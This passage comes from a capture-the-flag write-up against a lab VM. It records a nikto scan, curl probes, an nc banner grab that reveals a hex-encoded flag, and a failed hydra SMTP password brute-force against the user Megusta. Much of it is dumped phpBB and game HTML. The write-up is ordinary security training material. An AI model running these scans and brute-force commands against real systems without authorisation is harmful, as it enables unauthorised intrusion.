							<li class="separator"></li>
							<li>
								<a href="./search.php?sid=0411ba1f77073b6a0097e2f277b8b0d1" role="menuitem">
									<i class="icon fa-search fa-fw" aria-hidden="true"></i><span>Search</span>
								</a>
							</li>
					
											<li class="separator"></li>
																			<li>
								<a href="./memberlist.php?mode=team&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" role="menuitem">
									<i class="icon fa-shield fa-fw" aria-hidden="true"></i><span>The team</span>
								</a>
							</li>
																<li class="separator"></li>

									</ul>
			</div>
		</li>

				<li data-skip-responsive="true">
			<a href="/app.php/help/faq?sid=0411ba1f77073b6a0097e2f277b8b0d1" rel="help" title="Frequently Asked Questions" role="menuitem">
				<i class="icon fa-question-circle fa-fw" aria-hidden="true"></i><span>FAQ</span>
			</a>
		</li>
						
			<li class="rightside"  data-skip-responsive="true">
			<a href="./ucp.php?mode=login&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" title="Login" accesskey="x" role="menuitem">
				<i class="icon fa-power-off fa-fw" aria-hidden="true"></i><span>Login</span>
			</a>
		</li>
					<li class="rightside" data-skip-responsive="true">
				<a href="./ucp.php?mode=register&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" role="menuitem">
					<i class="icon fa-pencil-square-o  fa-fw" aria-hidden="true"></i><span>Register</span>
				</a>
			</li>
						</ul>

	<ul id="nav-breadcrumbs" class="nav-breadcrumbs linklist navlinks" role="menubar">
						<li class="breadcrumbs">
										<span class="crumb"  itemtype="http://data-vocabulary.org/Breadcrumb" itemscope=""><a href="./index.php?sid=0411ba1f77073b6a0097e2f277b8b0d1" itemprop="url" accesskey="h" data-navbar-reference="index"><i class="icon fa-home fa-fw"></i><span itemprop="title">Board index</span></a></span>

								</li>
		
					<li class="rightside responsive-search">
				<a href="./search.php?sid=0411ba1f77073b6a0097e2f277b8b0d1" title="View the advanced search options" role="menuitem">
					<i class="icon fa-search fa-fw" aria-hidden="true"></i><span class="sr-only">Search</span>
				</a>
			</li>
			</ul>

	</div>
</div>
	</div>

	
	<a id="start_here" class="anchor"></a>
	<div id="page-body" class="page-body" role="main">
		
		
<p class="right responsive-center time">It is currently Wed Apr 26, 2017 1:17 am</p>



	
				<div class="forabg">
			<div class="inner">
			<ul class="topiclist">
				<li class="header">
										<dl class="row-item">
						<dt><div class="list-inner">Forum</div></dt>
						<dd class="topics">Topics</dd>
						<dd class="posts">Posts</dd>
						<dd class="lastpost"><span>Last post</span></dd>
					</dl>
									</li>
			</ul>
			<ul class="topiclist forums">
		
					<li class="row">
						<dl class="row-item forum_read">
				<dt title="No unread posts">
										<div class="list-inner">
													<!--
								<a class="feed-icon-forum" title="Feed - Worka Suko Gameo Di Besto" href="/app.php/feed?sid=0411ba1f77073b6a0097e2f277b8b0d1?f=1">
									<i class="icon fa-rss-square fa-fw icon-orange" aria-hidden="true"></i><span class="sr-only">Feed - Worka Suko Gameo Di Besto</span>
								</a>
							-->
												<span class="forum-image"><img src="./images/rkt.png" alt="No unread posts" /></span>				<a href="./viewforum.php?f=1&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" class="forumtitle">Worka Suko Gameo Di Besto</a>
						<br />emay ayingplay uchmay amesgay ownay egistrarioray arnay edsay emay emailway ayay egustomay otay indfay away eomay ideyhohay				
												<div class="responsive-show" style="display: none;">
													</div>
											</div>
				</dt>
									<dd class="topics">0 <dfn>Topics</dfn></dd>
					<dd class="posts">0 <dfn>Posts</dfn></dd>
					<dd class="lastpost">
						<span>
																						No posts<br />&nbsp;
													</span>
					</dd>
							</dl>
					</li>
			
				</ul>

			</div>
		</div>
		


	<form method="post" action="./ucp.php?mode=login&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" class="headerspace">
	<h3><a href="./ucp.php?mode=login&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1">Login</a>&nbsp; &bull; &nbsp;<a href="./ucp.php?mode=register&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1">Register</a></h3>
		<fieldset class="quick-login">
			<label for="username"><span>Username:</span> <input type="text" tabindex="1" name="username" id="username" size="10" class="inputbox" title="Username" /></label>
			<label for="password"><span>Password:</span> <input type="password" tabindex="2" name="password" id="password" size="10" class="inputbox" title="Password" autocomplete="off" /></label>
										<span class="responsive-hide">|</span> <label for="autologin">Remember me <input type="checkbox" tabindex="4" name="autologin" id="autologin" /></label>
						<input type="submit" tabindex="5" name="login" value="Login" class="button2" />
			<input type="hidden" name="redirect" value="./index.php?sid=0411ba1f77073b6a0097e2f277b8b0d1" />

		</fieldset>
	</form>


	<div class="stat-block online-list">
		<h3>Who is online</h3>		<p>
						In total there is <strong>1</strong> user online :: 0 registered, 0 hidden and 1 guest (based on users active over the past 5 minutes)<br />Most users ever online was <strong>2</strong> on Sun Apr 02, 2017 5:33 pm<br /> <br />Registered users: No registered users
			<br /><em>Legend: <a style="color:#AA0000" href="./memberlist.php?mode=group&amp;g=5&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1">Administrators</a>, <a style="color:#00AA00" href="./memberlist.php?mode=group&amp;g=4&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1">Global moderators</a></em>					</p>
	</div>

	<div class="stat-block birthday-list">
		<h3>Birthdays</h3>
		<p>
						No birthdays today					</p>
	</div>

	<div class="stat-block statistics">
		<h3>Statistics</h3>
		<p>
						Total posts <strong>0</strong> &bull; Total topics <strong>0</strong> &bull; Total members <strong>1</strong> &bull; Our newest member <strong><a href="./memberlist.php?mode=viewprofile&amp;u=2&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" style="color: #AA0000;" class="username-coloured">Megusta</a></strong>
					</p>
	</div>


			</div>


<div id="page-footer" class="page-footer" role="contentinfo">
	<div class="navbar" role="navigation">
	<div class="inner">

	<ul id="nav-footer" class="nav-footer linklist" role="menubar">
		<li class="breadcrumbs">
									<span class="crumb"><a href="./index.php?sid=0411ba1f77073b6a0097e2f277b8b0d1" data-navbar-reference="index"><i class="icon fa-home fa-fw" aria-hidden="true"></i><span>Board index</span></a></span>					</li>
		
				<li class="rightside">All times are <span title="UTC">UTC</span></li>
							<li class="rightside">
				<a href="./ucp.php?mode=delete_cookies&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" data-ajax="true" data-refresh="true" role="menuitem">
					<i class="icon fa-trash fa-fw" aria-hidden="true"></i><span>Delete all board cookies</span>
				</a>
			</li>
												<li class="rightside" data-last-responsive="true">
				<a href="./memberlist.php?mode=team&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" role="menuitem">
					<i class="icon fa-shield fa-fw" aria-hidden="true"></i><span>The team</span>
				</a>
			</li>
							</ul>

	</div>
</div>

	<div class="copyright">
				Powered by <a href="https://www.phpbb.com/">phpBB</a>&reg; Forum Software &copy; phpBB Limited
									</div>

	<div id="darkenwrapper" class="darkenwrapper" data-ajax-error-title="AJAX error" data-ajax-error-text="Something went wrong when processing your request." data-ajax-error-text-abort="User aborted request." data-ajax-error-text-timeout="Your request timed out; please try again." data-ajax-error-text-parsererror="Something went wrong with the request and the server returned an invalid reply.">
		<div id="darken" class="darken">&nbsp;</div>
	</div>

	<div id="phpbb_alert" class="phpbb_alert" data-l-err="Error" data-l-timeout-processing-req="Request timed out.">
		<a href="#" class="alert_close">
			<i class="icon fa-times-circle fa-fw" aria-hidden="true"></i>
		</a>
		<h3 class="alert_title">&nbsp;</h3><p class="alert_text"></p>
	</div>
	<div id="phpbb_confirm" class="phpbb_alert">
		<a href="#" class="alert_close">
			<i class="icon fa-times-circle fa-fw" aria-hidden="true"></i>
		</a>
		<div class="alert_text"></div>
	</div>
</div>

</div>

<div>
	<a id="bottom" class="anchor" accesskey="z"></a>
	<img src="./cron.php?cron_type=cron.task.core.tidy_sessions&amp;sid=0411ba1f77073b6a0097e2f277b8b0d1" width="1" height="1" alt="cron" /></div>

<script type="text/javascript" src="./assets/javascript/jquery.min.js?assets_version=2"></script>
<script type="text/javascript" src="./assets/javascript/core.js?assets_version=2"></script>



<script type="text/javascript" src="./styles/prosilver/template/forum_fn.js?assets_version=2"></script>
<script type="text/javascript" src="./styles/prosilver/template/ajax.js?assets_version=2"></script>



</body>
</html>
root@kali:~# 

```

We try to scan the new found host with domain

```bash

root@kali:~# nikto -h http://D0Not5topMe.ctf
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.167
+ Target Hostname:    D0Not5topMe.ctf
+ Target Port:        80
+ Start Time:         2017-04-26 21:03:02 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /bin/: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /, fields: 0xd3 0x54c550ee22d56 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /web.config: ASP config file is accessible.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /config/: Directory indexing found.
+ /config/: Configuration information may be available remotely.
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /download/: This might be interesting...
+ OSVDB-3092: /files/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /store/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3268: /docs/: Directory indexing found.
+ OSVDB-3268: /styles/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Cookie phpbb3_3p16g_lang created without the httponly flag
+ 8256 requests: 0 error(s) and 23 item(s) reported on remote host
+ End Time:           2017-04-26 21:03:28 (GMT2) (26 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# curl http://D0Not5topMe.ctf/bin
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://d0not5topme.ctf/bin/">here</a>.</p>
</body></html>
root@kali:~# curl http://D0Not5topMe.ctf/bin/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /bin</title>
 </head>
 <body>
<h1>Index of /bin</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="phpbbcli.php">phpbbcli.php</a></td><td align="right">2017-01-07 16:16  </td><td align="right">2.7K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
root@kali:~# curl http://D0Not5topMe.ctf/bin/phpbbcli.php
#!/usr/bin/env php
This program must be run from the command line.
root@kali:~# 

```

Back to the PhpBB forum there are 3 possibilities
- Try to register
- Try to bruteforce the existing Megusta user

Let's try the first way, we click on register button which leads to the following page

```bash

root@kali:~# curl "http://d0not5topme.ctf/ucp.php?mode=register&sid=f60092a6ac568e3f4c8a1b24100de4b2"
<!DOCTYPE html>
<html dir="ltr" lang="en-gb">
<head>

<meta charset="utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1" />

<title>MegustaGameo - User Control Panel - Register</title>

	<link rel="alternate" type="application/atom+xml" title="Feed - MegustaGameo" href="/app.php/feed?sid=2e99e86ddabeeddd550f456280aecf70">			<link rel="alternate" type="application/atom+xml" title="Feed - New Topics" href="/app.php/feed/topics?sid=2e99e86ddabeeddd550f456280aecf70">				

<!--
	phpBB style name: prosilver
	Based on style:   prosilver (this is the default phpBB3 style)
	Original author:  Tom Beddard ( http://www.subBlue.com/ )
	Modified by:
-->

<link href="./assets/css/font-awesome.min.css?assets_version=2" rel="stylesheet">
<link href="./styles/prosilver/theme/stylesheet.css?assets_version=2" rel="stylesheet">
<link href="./styles/prosilver/theme/en/stylesheet.css?assets_version=2" rel="stylesheet">




<!--[if lte IE 9]>
	<link href="./styles/prosilver/theme/tweaks.css?assets_version=2" rel="stylesheet">
<![endif]-->





</head>
<body id="phpbb" class="nojs notouch section-ucp ltr ">


<div id="wrap" class="wrap">
	<a id="top" class="top-anchor" accesskey="t"></a>
	<div id="page-header">
		<div class="headerbar" role="banner">
					<div class="inner">

			<div id="site-description" class="site-description">
				<a id="logo" class="logo" href="./index.php?sid=2e99e86ddabeeddd550f456280aecf70" title="Board index"><span class="site_logo"></span></a>
				<h1>MegustaGameo</h1>
				<p>GameoGameoGameo</p>
				<p class="skiplink"><a href="#start_here">Skip to content</a></p>
			</div>

									<div id="search-box" class="search-box search-header" role="search">
				<form action="./search.php?sid=2e99e86ddabeeddd550f456280aecf70" method="get" id="search">
				<fieldset>
					<input name="keywords" id="keywords" type="search" maxlength="128" title="Search for keywords" class="inputbox search tiny" size="20" value="" placeholder="Search…" />
					<button class="button button-search" type="submit" title="Search">
						<i class="icon fa-search fa-fw" aria-hidden="true"></i><span class="sr-only">Search</span>
					</button>
					<a href="./search.php?sid=2e99e86ddabeeddd550f456280aecf70" class="button button-search-end" title="Advanced search">
						<i class="icon fa-cog fa-fw" aria-hidden="true"></i><span class="sr-only">Advanced search</span>
					</a>
					<input type="hidden" name="sid" value="2e99e86ddabeeddd550f456280aecf70" />

				</fieldset>
				</form>
			</div>
						
			</div>
					</div>
				<div class="navbar" role="navigation">
	<div class="inner">

	<ul id="nav-main" class="nav-main linklist" role="menubar">

		<li id="quick-links" class="quick-links dropdown-container responsive-menu" data-skip-responsive="true">
			<a href="#" class="dropdown-trigger">
				<i class="icon fa-bars fa-fw" aria-hidden="true"></i><span>Quick links</span>
			</a>
			<div class="dropdown">
				<div class="pointer"><div class="pointer-inner"></div></div>
				<ul class="dropdown-contents" role="menu">
					
											<li class="separator"></li>
																									<li>
								<a href="./search.php?search_id=unanswered&amp;sid=2e99e86ddabeeddd550f456280aecf70" role="menuitem">
									<i class="icon fa-file-o fa-fw icon-gray" aria-hidden="true"></i><span>Unanswered topics</span>
								</a>
							</li>
							<li>
								<a href="./search.php?search_id=active_topics&amp;sid=2e99e86ddabeeddd550f456280aecf70" role="menuitem">
									<i class="icon fa-file-o fa-fw icon-blue" aria-hidden="true"></i><span>Active topics</span>
								</a>
							</li>
							<li class="separator"></li>
							<li>
								<a href="./search.php?sid=2e99e86ddabeeddd550f456280aecf70" role="menuitem">
									<i class="icon fa-search fa-fw" aria-hidden="true"></i><span>Search</span>
								</a>
							</li>
					
											<li class="separator"></li>
																			<li>
								<a href="./memberlist.php?mode=team&amp;sid=2e99e86ddabeeddd550f456280aecf70" role="menuitem">
									<i class="icon fa-shield fa-fw" aria-hidden="true"></i><span>The team</span>
								</a>
							</li>
																<li class="separator"></li>

									</ul>
			</div>
		</li>

				<li data-skip-responsive="true">
			<a href="/app.php/help/faq?sid=2e99e86ddabeeddd550f456280aecf70" rel="help" title="Frequently Asked Questions" role="menuitem">
				<i class="icon fa-question-circle fa-fw" aria-hidden="true"></i><span>FAQ</span>
			</a>
		</li>
						
			<li class="rightside"  data-skip-responsive="true">
			<a href="./ucp.php?mode=login&amp;sid=2e99e86ddabeeddd550f456280aecf70" title="Login" accesskey="x" role="menuitem">
				<i class="icon fa-power-off fa-fw" aria-hidden="true"></i><span>Login</span>
			</a>
		</li>
						</ul>

	<ul id="nav-breadcrumbs" class="nav-breadcrumbs linklist navlinks" role="menubar">
						<li class="breadcrumbs">
										<span class="crumb"  itemtype="http://data-vocabulary.org/Breadcrumb" itemscope=""><a href="./index.php?sid=2e99e86ddabeeddd550f456280aecf70" itemprop="url" accesskey="h" data-navbar-reference="index"><i class="icon fa-home fa-fw"></i><span itemprop="title">Board index</span></a></span>

								</li>
		
					<li class="rightside responsive-search">
				<a href="./search.php?sid=2e99e86ddabeeddd550f456280aecf70" title="View the advanced search options" role="menuitem">
					<i class="icon fa-search fa-fw" aria-hidden="true"></i><span class="sr-only">Search</span>
				</a>
			</li>
			</ul>

	</div>
</div>
	</div>

	
	<a id="start_here" class="anchor"></a>
	<div id="page-body" class="page-body" role="main">
		
		


	<form method="post" action="./ucp.php?mode=register&amp;sid=2e99e86ddabeeddd550f456280aecf70" id="agreement">

	<div class="panel">
		<div class="inner">
		<div class="content">
			<h2 class="sitename-title">MegustaGameo - Registration</h2>
						<p>By accessing “MegustaGameo” (hereinafter “we”, “us”, “our”, “MegustaGameo”, “http://d0not5topme.ctf”), you agree to be legally bound by the following terms. If you do not agree to be legally bound by all of the following terms then please do not access and/or use “MegustaGameo”. We may change these at any time and we’ll do our utmost in informing you, though it would be prudent to review this regularly yourself as your continued usage of “MegustaGameo” after changes mean you agree to be legally bound by these terms as they are updated and/or amended.<br />
	<br />
	Our forums are powered by phpBB (hereinafter “they”, “them”, “their”, “phpBB software”, “www.phpbb.com”, “phpBB Limited”, “phpBB Teams”) which is a bulletin board solution released under the “<a href="http://opensource.org/licenses/gpl-2.0.php">GNU General Public License v2</a>” (hereinafter “GPL”) and can be downloaded from <a href="https://www.phpbb.com/">www.phpbb.com</a>. The phpBB software only facilitates internet based discussions; phpBB Limited is not responsible for what we allow and/or disallow as permissible content and/or conduct. For further information about phpBB, please see: <a href="https://www.phpbb.com/">https://www.phpbb.com/</a>.<br />
	<br />
	You agree not to post any abusive, obscene, vulgar, slanderous, hateful, threatening, sexually-orientated or any other material that may violate any laws be it of your country, the country where “MegustaGameo” is hosted or International Law. Doing so may lead to you being immediately and permanently banned, with notification of your Internet Service Provider if deemed required by us. The IP address of all posts are recorded to aid in enforcing these conditions. You agree that “MegustaGameo” have the right to remove, edit, move or close any topic at any time should we see fit. As a user you agree to any information you have entered to being stored in a database. While this information will not be disclosed to any third party without your consent, neither “MegustaGameo” nor phpBB shall be held responsible for any hacking attempt that may lead to the data being compromised.
	</p>
					</div>
		</div>
	</div>

	<div class="panel">
		<div class="inner">
		<fieldset class="submit-buttons">
						<input type="submit" name="agreed" id="agreed" value="I agree to these terms" class="button1" />&nbsp;
			<input type="submit" name="not_agreed" value="I do not agree to these terms" class="button2" />
						<input type="hidden" name="FLaR6yF1nD3rZ_html" value="" />

			<input type="hidden" name="creation_time" value="1493171697" />
<input type="hidden" name="form_token" value="c425ed610f461a59c0f9571fe8fdd208557a3a91" />

		</fieldset>
		</div>
	</div>
	</form>


			</div>


<div id="page-footer" class="page-footer" role="contentinfo">
	<div class="navbar" role="navigation">
	<div class="inner">

	<ul id="nav-footer" class="nav-footer linklist" role="menubar">
		<li class="breadcrumbs">
									<span class="crumb"><a href="./index.php?sid=2e99e86ddabeeddd550f456280aecf70" data-navbar-reference="index"><i class="icon fa-home fa-fw" aria-hidden="true"></i><span>Board index</span></a></span>					</li>
		
				<li class="rightside">All times are <span title="UTC">UTC</span></li>
							<li class="rightside">
				<a href="./ucp.php?mode=delete_cookies&amp;sid=2e99e86ddabeeddd550f456280aecf70" data-ajax="true" data-refresh="true" role="menuitem">
					<i class="icon fa-trash fa-fw" aria-hidden="true"></i><span>Delete all board cookies</span>
				</a>
			</li>
												<li class="rightside" data-last-responsive="true">
				<a href="./memberlist.php?mode=team&amp;sid=2e99e86ddabeeddd550f456280aecf70" role="menuitem">
					<i class="icon fa-shield fa-fw" aria-hidden="true"></i><span>The team</span>
				</a>
			</li>
							</ul>

	</div>
</div>

	<div class="copyright">
				Powered by <a href="https://www.phpbb.com/">phpBB</a>&reg; Forum Software &copy; phpBB Limited
									</div>

	<div id="darkenwrapper" class="darkenwrapper" data-ajax-error-title="AJAX error" data-ajax-error-text="Something went wrong when processing your request." data-ajax-error-text-abort="User aborted request." data-ajax-error-text-timeout="Your request timed out; please try again." data-ajax-error-text-parsererror="Something went wrong with the request and the server returned an invalid reply.">
		<div id="darken" class="darken">&nbsp;</div>
	</div>

	<div id="phpbb_alert" class="phpbb_alert" data-l-err="Error" data-l-timeout-processing-req="Request timed out.">
		<a href="#" class="alert_close">
			<i class="icon fa-times-circle fa-fw" aria-hidden="true"></i>
		</a>
		<h3 class="alert_title">&nbsp;</h3><p class="alert_text"></p>
	</div>
	<div id="phpbb_confirm" class="phpbb_alert">
		<a href="#" class="alert_close">
			<i class="icon fa-times-circle fa-fw" aria-hidden="true"></i>
		</a>
		<div class="alert_text"></div>
	</div>
</div>

</div>

<div>
	<a id="bottom" class="anchor" accesskey="z"></a>
	</div>

<script type="text/javascript" src="./assets/javascript/jquery.min.js?assets_version=2"></script>
<script type="text/javascript" src="./assets/javascript/core.js?assets_version=2"></script>



<script type="text/javascript" src="./styles/prosilver/template/forum_fn.js?assets_version=2"></script>
<script type="text/javascript" src="./styles/prosilver/template/ajax.js?assets_version=2"></script>



</body>
</html>
root@kali:~# 

```

We notice the admin email Megusta@G4M35.ctf, which contains also a new domain name (G4M35.ctf).
At this point we can eventually trigger a reset password functionality, but even setting a new password seems pointless, since we need the existing one.
We decide to try to crack the SMTP password for user Megusta, but we notice that the auth login is disabled

```bash

root@kali:~# hydra -s 25 -l megusta@g4m35.ctf -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 1 -w 20 -f 192.168.1.167 smtp
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-27 08:27:57
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 1 task per 1 server, overall 64 tasks, 1008 login tries (l:1/p:1008), ~15 tries per task
[DATA] attacking service smtp on port 25
[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

[ERROR] SMTP LOGIN AUTH, either this auth is disabled or server is not using auth: 503 AUTH command used when not advertised

^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
root@kali:~# 

```

At this point we pass to the next host in the domain part of the mail, by editing again the file /etc/hosts in the following way

```bash

root@kali:~# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# CFT

192.168.1.167 g4m35.ctf

root@kali:~# 

```

Actually we find the third flag in hexadecimal on the port 25

```bash

root@kali:~# nc -vv 192.168.1.167 25
g4m35.ctf [192.168.1.167] 25 (smtp) open
220 46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874 327231646434 717070756 5793437 347 3767879610a EXIM SMTP
^C sent 0, rcvd 113
root@kali:~# 

```

Converting such value from hex to ascii on http://www.rapidtables.com/convert/number/hex-to-ascii.htm brings the third flag: FL46_3:29dryccwVV2r1dd4qppuWC47g

The homepage looks like a videogame

```bash

root@kali:~# curl http://g4m35.ctf
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Missile Game</title>
  <meta name="author" content="Ben Mather &lt;bwhmather@bwhmather.com&gt;" />
  <meta name="description" content="A 3D game using SVG and javascript" />

  <meta name="viewport" content="width=device-width, height=device-height, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />
   
  <!--== CSS ==============================================================-->
  <style type="text/css">
    /* <![CDATA[ */
    body {
        margin: 0;
    }

    .barrier path {
      stroke-width: 2;
      stroke-linejoin: round;
    }

    .hud-background {
      stroke: none;
      fill: white;
      fill-opacity: 0.8;      
    }

    .hud-foreground {
      stroke: black;
      stroke-linejoin: round;
      stroke-linecap: round;
      fill: none;
    }

    text {
      font-family: sans-serif;
      font-weight: bold;
    }

    * {cursor:crosshair}

    /* ]]> */
  </style>
  <style title="style-hide-mouse" type="text/css">
    /* <![CDATA[ */
    * {cursor:none}
    /* ]]> */
  </style>
</head>
<body>
  <svg
     version="1.1"
     baseProfile="full"
     xmlns="http://www.w3.org/2000/svg"
     xmlns:svg="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     style="position: fixed; width: 100%; height: 100%; margin: 0;">
   
 
  <!--== TUNNEL ===============================================================-->
    <svg id="tunnel"
       width="100%" height="100%"
       preserveAspectRatio="xMidYMid meet"
       viewBox="-100 -100 200 200"
       visibility="hidden" >
    </svg>
  
  <!--== EXPLOSION!!!! ========================================================-->
    <svg
       width="100%" height="100%"
       preserveAspectRatio="xMidYMid meet"
       viewBox="-100 -100 200 200"
       visibility="visible" >
      <path id="explosion"
         visibility="hidden"
         transform="scale(3,3)"
         fill="#f5bd3c"
         stroke="#ff2626"       
         stroke-width="0.5"
         d="m -0.63488,-4.3752
            c  0.24879,1.233, 1.1883,2.6366, 1.768,0.69037
               0.74264,0.71431, 1.2069,0.6277, 1.6362,-0.5115
              -0.034821,1.0871, 0.096633,1.6827, 0.74401,1.7541
              -0.091757,1.4249, 0.70746,2.0783, 1.2188,1.8749
              -0.894,0.93533, -0.4517,1.2793, -0.1438,1.9055
              -0.6904,0.3722, -0.6323,1.1294, -0.2202,2.0686 
              -0.8022,-0.0916, -1.2136,0.497, -0.9903,2.1906
              -0.5751,-0.6694, -1.2232,-0.5666, -1.4943,1.3293
              -0.162,-1.1736, -0.4604,-2.6908, -1.3395,-1.1883
              -0.49014,-2.0469, -0.93497,-0.738, -1.3874,0.0043
               0.10639,-0.88002, 0.073166,-1.5303, -0.60252,-1.123
               0.44939,-0.82156, 1.0157,-1.7132, -0.041883,-3.03
               0.45163,-1.7508, 0.018089,-2.1904, -0.50161,-2.5024
               0.67964,-1.0053, 0.49818,-2.0107, 0.28858,-3.016
               0.52476,1.1059, 0.93462,1.3608, 1.0661,-0.4466
            z
            m -0.15082,-1.5778
            c  0.074098,2.0969, -0.58436,1.8254, -1.3271,1.2814
               0.54867,2.1298, 0.033405,2.9625, -0.45613,3.8265
               1.306,0.68211, 0.96098,2.0011, 0.39794,3.4043
               1.3865,-0.46902, 1.0123,0.84256, 0.083778,2.7148
               0.6771,-0.1353, 1.0998,-0.2861, 1.0191,1.6048
               0.47854,-1.0645, 1.3389,-2.4648, 1.4732,1.0237
               0.69655,-2.8185, 1.0794,-1.349, 1.487,0.2973
               0.3541,-1.4463, 0.8078,-2.8978, 1.864,-1.3746
              -0.1962,-1.8445, -0.125,-3.2698, 1.3195,-2.5424
              -1.163,-2.1605, -0.2327,-2.5422, 0.3352,-3.2319
              -1.4432,-0.2307, -0.4485,-0.83498, -0.0527,-1.9151
              -1.2304,-0.5137, -1.6742,-1.4126, -1.2459,-2.7388
              -0.9898,1.2593, -0.9672,-0.606, -1.131,-1.896
              -0.51549,1.084, -0.9993,2.4142, -1.8584,0.82793
              -0.92276,2.4614, -1.531,0.17894, -1.9087,-1.2819
            z"><animate
           attributeName="d"
           dur="0.4s"
           fill="freeze"
           values="m -0.63488,-4.3752
                   c  0.24879,1.233, 1.1883,2.6366, 1.768,0.69037
                      0.74264,0.71431, 1.2069,0.6277, 1.6362,-0.5115
                     -0.034821,1.0871, 0.096633,1.6827, 0.74401,1.7541
                     -0.091757,1.4249, 0.70746,2.0783, 1.2188,1.8749
                     -0.894,0.93533, -0.4517,1.2793, -0.1438,1.9055
                     -0.6904,0.3722, -0.6323,1.1294, -0.2202,2.0686
                     -0.8022,-0.0916, -1.2136,0.497, -0.9903,2.1906
                     -0.5751,-0.6694, -1.2232,-0.5666, -1.4943,1.3293
                     -0.162,-1.1736, -0.4604,-2.6908, -1.3395,-1.1883
                     -0.49014,-2.0469, -0.93497,-0.738, -1.3874,0.0043
                      0.10639,-0.88002, 0.073166,-1.5303, -0.60252,-1.123
                      0.44939,-0.82156, 1.0157,-1.7132, -0.041883,-3.03
                      0.45163,-1.7508, 0.018089,-2.1904, -0.50161,-2.5024
                      0.67964,-1.0053, 0.49818,-2.0107, 0.28858,-3.016
                      0.52476,1.1059, 0.93462,1.3608, 1.0661,-0.4466
                   z
                   m -0.15082,-1.5778
                   c  0.074098,2.0969, -0.58436,1.8254, -1.3271,1.2814
                      0.54867,2.1298, 0.033405,2.9625, -0.45613,3.8265
                      1.306,0.68211, 0.96098,2.0011, 0.39794,3.4043
                      1.3865,-0.46902, 1.0123,0.84256, 0.083778,2.7148
                      0.6771,-0.1353, 1.0998,-0.2861, 1.0191,1.6048
                      0.47854,-1.0645, 1.3389,-2.4648, 1.4732,1.0237
                      0.69655,-2.8185, 1.0794,-1.349, 1.487,0.2973
                      0.3541,-1.4463, 0.8078,-2.8978, 1.864,-1.3746
                     -0.1962,-1.8445, -0.125,-3.2698, 1.3195,-2.5424
